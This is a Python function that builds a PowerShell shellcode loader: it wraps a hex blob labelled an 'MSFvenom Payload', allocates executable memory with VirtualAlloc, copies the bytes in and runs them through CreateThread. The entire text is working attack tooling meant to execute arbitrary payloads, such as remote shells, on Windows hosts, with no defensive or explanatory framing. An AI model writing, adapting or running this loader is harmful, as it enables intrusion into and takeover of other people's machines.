def inject_shellcode(hex_blob_string):
    """
    Accepts a raw hex blob string (e.g., '0xfc,0xe8,...') and returns a full PowerShell code list
    that allocates memory, copies the shellcode, and executes it using CreateThread.
    """
    return [
        "# --- Injected MSFvenom Payload ---",
        "[Byte[]] $buf = " + f"@({hex_blob_string})",
        "$unsafeNativeMethods = @\"",
        "using System;",
        "using System.Runtime.InteropServices;",
        "public class UnsafeNativeMethods {",
        "  [DllImport(\"kernel32\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
        "  [DllImport(\"kernel32\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);",
        "  [DllImport(\"msvcrt\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);",
        "}",
        "\"@",
        "Add-Type $unsafeNativeMethods",
        "$size = 0x1000",
        "$mem = [UnsafeNativeMethods]::VirtualAlloc(0, $buf.Length, 0x1000, 0x40)",
        "[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)",
        "$t = 0",
        "[UnsafeNativeMethods]::CreateThread(0, 0, $mem, 0, 0, [ref]$t)"
    ]
